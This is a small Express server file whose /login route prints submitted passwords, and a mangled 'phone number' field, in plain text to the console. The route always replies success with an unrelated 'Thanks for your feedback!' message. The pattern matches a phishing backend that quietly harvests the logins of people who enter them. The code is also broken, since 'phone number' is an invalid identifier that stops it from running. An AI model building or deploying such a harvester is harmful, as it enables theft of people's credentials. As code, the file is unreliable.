const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(express.static("public"));

app.post("/login", (req, res) => {
    const { username, password } = req.body;

    console.log("==============================");
    console.log("LOGIN ATTEMPT");
    console.log("phone number:", phone number);
    console.log("Password:",password);
    console.log("==============================");

    res.json({
        success: true,
        message: "Thanks for your feedback!"
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
